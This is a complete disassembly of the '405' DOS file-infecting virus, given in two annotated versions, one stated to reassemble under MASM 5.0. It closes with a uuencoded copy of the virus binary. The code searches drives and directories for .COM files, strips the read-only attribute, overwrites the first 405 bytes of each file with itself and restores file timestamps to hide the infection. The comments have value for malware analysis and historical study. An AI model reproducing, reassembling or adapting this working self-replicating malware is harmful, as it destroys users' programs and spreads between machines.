;405 virus
;disassembled 10th March 1991 by Fred Deakin.
;

start:
       xchg si,ax            ;96      }marker bytes ?
       add [bx+si],al            ;00 00   }
       sahf              ;9e      }
       add [bx+si],al            ;00 00   }
       nop               ;90      }
       mov ax,0000h          ;clear ax
       mov byte es:[drive],al        ;default drive?
       mov byte es:[dir_path],al     ;clear first byte in directory path
       mov byte es:[l_drvs],al       ;clear logical drives
       push ax               ;save ax
       mov ah,19h            ;get current drive
       int 21h               ;call msdos
       mov byte es:[drive],al        ;and save
       mov ah,47h            ;get directory path
       add al,01h            ;add 1 to drive code
       push ax               ;and save
       mov dl,al             ;move drive code to dl
       lea si,[dir_path]         ;si=offset address of directory buffer
       int 21h               ;call msdos
       pop ax                ;get back drive code
       mov ah,0eh            ;set default drive
       sub al,01h            ;subtract and get logical drive
       mov dl,al             ;drive wanted
       int 21h               ;call msdos
       mov byte es:[l_drvs],al       ;store how many logical drives
l0139:
       mov al,byte es:[drive]        ;get default drive
       cmp al,00h            ;drive a:?
       jnz l0152             ;if not jump forward
       mov ah,0eh            ;set default drive
       mov dl,02h            ;drive c:
       int 21h               ;call msdos
       mov ah,19h            ;get current drive
       int 21h               ;call msdos
       mov byte es:[c_drv],al         ;and save
       jmp l0179             ;jump forward
       nop               ;no operation
l0152:
       cmp al,01h            ;drive b:?
       jnz l0167             ;jump forward if not
       mov ah,0eh            ;set default drive
       mov dl,02h            ;to drive c:
       int 21h               ;call msdos
       mov ah,19h            ;get current drive
       int 21h               ;call msdos
       mov byte es:[c_drv],al         ;and save
       jmp l0179             ;jump forward
       nop               ;no operation
l0167:
       cmp al,02h            ;drive c:?
       jnz l0179             ;if not jump forward
       mov ah,0eh            ;set default drive
       mov dl,00h            ;drive a:
       int 21h               ;call msdos
       mov ah,19h            ;get current drive
       int 21h               ;call msdos
       mov byte es:[c_drv],al        ;and save
l0179:
       mov ah,4eh            ;search for first
       mov cx,0001h          ;file attributes
       lea dx,[f_name]           ;point to file name
       int 21h               ;call msdos
       jb l0189              ;no .COM files
       jmp l01a9             ;found one
       nop               ;no operation
l0189:
       mov ah,3bh            ;set directory
       lea dx,[l0297]            ;point to path
       int 21h               ;call msdos
       mov ah,4eh            ;search for first
       mov cx,0011h          ;set attributes
       lea dx,[l0292]            ;
       int 21h               ;call msdos
       jb l0139              ;no .COM files
       jmp l0179             ;jump back
l01a0:
       mov ah,4fh            ;search for next
       int 21h               ;call msdos
       jb l0189              ;no .COM files found
       jmp l01a9             ;found one
       nop               ;no operation
l01a9:
       mov ah,3dh            ;open file
       mov al,02h            ;for read/write access
       mov dx,009eh          ;offset address of path name
       int 21h               ;call msdos
       mov bx,ax             ;save file handle
       mov ah,3fh            ;read file
       mov cx,0195h          ;would you believe 405 bytes to read
       nop               ;no operation
       mov dx,0e000h             ;offset address of buffer
       nop               ;no operation
       int 21h               ;call msdos
       mov ah,3eh            ;close file
       int 21h               ;call msdos
       mov bx,es:[0e000h]        ;get first byte of loaded buffer
       cmp bx,9600h          ;405 virus already installed?
       jz l01a0              ;yes jump back and search for next
       mov ah,43h            ;get/set file attributes
       mov al,00h            ;get file attributes
       mov dx,009eh          ;offset address of path name
       int 21h               ;call msdos
       mov ah,43h            ;get/set file attributes
       mov al,01h            ;set file attributes
       and cx,00feh          ;no files read only
       int 21h               ;call msdos
       mov ah,3dh            ;open file
       mov al,02h            ;for read/write access
       mov dx,009eh          ;offset address of path name
       int 21h               ;call msdos
       mov bx,ax             ;save file handle in bx
       mov ah,57h            ;get/set date and time
       mov al,00h            ;get file date and time
       int 21h               ;call msdos
       push cx               ;file time
       push dx               ;file date
       mov dx,cs:[0295h]         ;get variable byte?
       mov cs:[0e195h],dx        ;place at end of file loaded
       mov dx,cs:[0e001h]        ;get second byte in buffer
       lea cx,ds:[0194h]         ;
       sub dx,cx             ;
       mov cs:[0295h],dx         ;place at end of file
       mov ah,40h            ;write file
       mov cx,0195h          ;amount of bytes to write
       nop               ;no operation
       lea dx,[start]            ;get starting location
       int 21h               ;call msdos
       mov ah,57h            ;get/set file date and time
       mov al,01h            ;set file date and time
       pop dx                ;file date
       pop cx                ;file time
       int 21h               ;call msdos
       mov ah,3eh            ;close file
       int 21h               ;call msdos
       mov dx,cs:[0e195h]        ;get variable
       mov cs:[0295h],dx         ;place at end of file
       jmp l0234             ;jump forward
       nop               ;no operation
l0234:
       mov ah,0eh            ;set default drive
       mov dl,byte cs:[drive]        ;get back original default drive
       int 21h               ;call msdos
       mov ah,3bh            ;set directory
       lea dx,[c_drv]            ;8d 16 4a 02
       int 21h               ;call msdos
       mov ah,00h            ;return to dos
       int 21h               ;call msdos
drive:
       db 02                 ;drive variable
c_drv:
       db 00                 ;current drive
dir_path:
       db "TEST"
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
l_drvs:
    db 00                ;how many logical drives on system
f_name:
    db "*.COM"
    db 0h
l0292:
    db 2ah,00h
l0293:
    db 0e9h,00h
l0295:
    db 00h
l0297:

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       title  The '405' virus
       page   65,132

       ; The virus overwrites the first 405 bytes of a COM file.  If the
       ; length of the COM file is less than this, the length is increased
       ; to 405 bytes.

       ; The disassembly has been tested by re-assembly using MASM 5.0.

BUFFER SEGMENT AT 0

       ORG    295H
DW0295 DW     ?
DB0297 DB     ?

       ORG    0E000H
DWE000 DW     ?                    ; Read buffer area

       ORG    0E195H
DWE195 DW     ?                    ; Program after virus

BUFFER ENDS

CODE   SEGMENT BYTE PUBLIC 'CODE'
       ASSUME CS:CODE,DS:NOTHING,ES:BUFFER

VIRLEN EQU    OFFSET ENDADR-START
       ORG    100H

START: XCHG   SI,AX
       ADD    [BX+SI],AL
       SAHF
       ADD    [BX+SI],AL
       NOP

       MOV    AX,0                 ; Clear register
       MOV    ES:DB0249,AL         ; Set current disk to default
       MOV    ES:DB024B,AL         ; Set pathname store to zero
       MOV    ES:DB028B,AL         ; Set number of drives to zero
       PUSH   AX
       MOV    AH,19H               ; Get current disk function
       INT    21H                  ; DOS service
       MOV    ES:DB0249,AL         ; Save current disk
       MOV    AH,47H               ; Get current directory function
       ADD    AL,1                 ; Next drive (A)
       PUSH   AX
       MOV    DL,AL                ; Drive A
       LEA    SI,DB024B            ; Pathname store
       INT    21H                  ; DOS service
       POP    AX
       MOV    AH,0EH               ; Select disk function
       SUB    AL,1                 ; Convert drive for select function
       MOV    DL,AL                ; Move drive
       INT    21H                  ; DOS service
       MOV    ES:DB028B,AL         ; Save number of drives
BP0139:       MOV    AL,ES:DB0249         ; Get current disk
       CMP    AL,0                 ; Is drive A?
       JNZ    BP0152               ; Branch if not
       MOV    AH,0EH               ; Select disk function
       MOV    DL,2                 ; Change drive to B
       INT    21H                  ; DOS service
       MOV    AH,19H               ; Get current disk function
       INT    21H                  ; DOS service
       MOV    ES:DB024A,AL         ; Save new current drive
       JMP    BP0179

BP0152:       CMP    AL,1                 ; Is drive B?
       JNZ    BP0167               ; Branch if not
       MOV    AH,0EH               ; Select disk function
       MOV    DL,2                 ; Change drive to C
       INT    21H                  ; DOS service
       MOV    AH,19H               ; Get current disk function
       INT    21H                  ; DOS service
       MOV    ES:DB024A,AL         ; Save new current drive
       JMP    BP0179

BP0167:       CMP    AL,2                 ; Is drive C?
       JNZ    BP0179               ; Branch if not
       MOV    AH,0EH               ; Select disk function
       MOV    DL,0                 ; Change drive to A
       INT    21H                  ; DOS service
       MOV    AH,19H               ; Get current disk function
       INT    21H                  ; DOS service
       MOV    ES:DB024A,AL         ; Save new current drive
BP0179:       MOV    AH,4EH               ; Find first file function
       MOV    CX,1                 ; Find read-only files, not system
       LEA    DX,DB028C            ; Path '*.COM'
       INT    21H                  ; DOS service
       JB     BP0189               ; Branch if error
       JMP    BP01A9               ; Process COM file

BP0189:       MOV    AH,3BH               ; Change current directory function
       LEA    DX,DB0297            ; Directory pathname (this is past the end)
       INT    21H                  ; DOS service
       MOV    AH,4EH               ; Find first file function
       MOV    CX,0011H             ; Find directory and read-only
       LEA    DX,DB0292            ; Path '*'
       INT    21H                  ; DOS service
       JB     BP0139               ; Branch if error
       JMP    BP0179               ; Find a COM file

BP01A0:       MOV    AH,4FH               ; Find next file function
       INT    21H                  ; DOS service
       JB     BP0189               ; Branch if error
       JMP    BP01A9               ; Process COM file

       ; Process COM file

BP01A9:       MOV    AH,3DH               ; Open handle function
       MOV    AL,2                 ; R/W access
       MOV    DX,009EH             ; File pathname
       INT    21H                  ; DOS service
       MOV    BX,AX                ; Move handle
       MOV    AH,3FH               ; Read handle function
       MOV    CX,VIRLEN            ; Length of virus
       NOP
       MOV    DX,OFFSET DWE000     ; Read it in way down there
       NOP
       INT    21H                  ; DOS service
       MOV    AH,3EH               ; Close handle function
       INT    21H                  ; DOS service
       MOV    BX,DWE000            ; Get first word of COM file
       CMP    BX,9600H             ; Is it infected? (should be 0096H)
       JZ     BP01A0               ; Yes, find another one
       MOV    AH,43H               ; \ Get file attributes function
       MOV    AL,0                 ; /
       MOV    DX,009EH             ; File pathname
       INT    21H                  ; DOS service
       MOV    AH,43H               ; \ Set file attributes function
       MOV    AL,1                 ; /
       AND    CX,00FEH             ; Set off read only attribute
       INT    21H                  ; DOS service
       MOV    AH,3DH               ; Open handle function
       MOV    AL,2                 ; R/W mode
       MOV    DX,009EH             ; File pathname
       INT    21H                  ; DOS service
       MOV    BX,AX                ; Move handle
       MOV    AH,57H               ; \ Get file date & time function
       MOV    AL,0                 ; /
       INT    21H                  ; DOS service
       PUSH   CX
       PUSH   DX
       ASSUME ES:NOTHING
       MOV    DX,CS:DW0295         ; Get word after virus here
       MOV    CS:DWE195,DX         ; Move to same position in prog
       MOV    DX,CS:DWE000+1              ; Get displacement from initial jump
       LEA    CX,DB0294-100H              ; Length of virus minus one
       SUB    DX,CX
       MOV    CS:DW0295,DX         ; Store in word after virus
       MOV    AH,40H               ; Write handle function
       MOV    CX,VIRLEN            ; Length of virus
       NOP
       LEA    DX,START             ; Beginning of virus
       INT    21H                  ; DOS service
       MOV    AH,57H               ; \ Set file date & time function
       MOV    AL,1                 ; /
       POP    DX
       POP    CX
       INT    21H                  ; DOS service
       MOV    AH,3EH               ; Close handle function
       INT    21H                  ; DOS service
       MOV    DX,CS:DWE195         ; Get word after virus
       MOV    CS:DW0295,DX         ; Move to same position here
       JMP    BP0234

BP0234:       MOV    AH,0EH               ; Select disk function
       MOV    DL,CS:DB0249         ; Get current disk
       INT    21H                  ; DOS service
       MOV    AH,3BH               ; Change current directory function
       LEA    DX,DB024A            ; Address of path - this is incorrect
       INT    21H                  ; DOS service
       MOV    AH,0                 ; Terminate program function
       INT    21H                  ; DOS service

DB0249 DB     2                    ; Current disk
DB024A DB     0                    ; New current drive

       ; There should be an extra byte at this point containing '\'
       ; for use by the change directory function - this is why that
       ; function is pointing at the previous field

DB024B DB     'TEST', 3CH DUP (0)
DB028B DB     0DH                  ; Number of drives
DB028C DB     '*.COM', 0
DB0292 DB     '*', 0
DB0294 DB     0E9H

ENDADR EQU    $

CODE   ENDS

       END    START
begin 775 405_.com
ME@``G@``D+@``":B/0(FHC\")J)_`E"T&O=M$_-(7+EZP"T/;`"NIX`S2&+V+0_N8D!D+H`
MX)#-(;0^S2$FBQX`X('[`)9TTK1#L`"ZG@#-(;1#L`&!X?X`S2&T/;`"NIX`
MS2&+V+17L`#-(5%2+HL6E0(NB1:5X2Z+%@'@N8@!*]$NB1:5`K1`N8D!D+H`
M`P`5I9S2&T/LTA+HL6E>$NB1:5`NL`M`XNBA8]`LTAM#NZ/@+-(;0`
MS2$"`%1%4U0`````````````````````````````````````````````````
A```````````````````````````````-*BY#3TT`*@#I
`
end

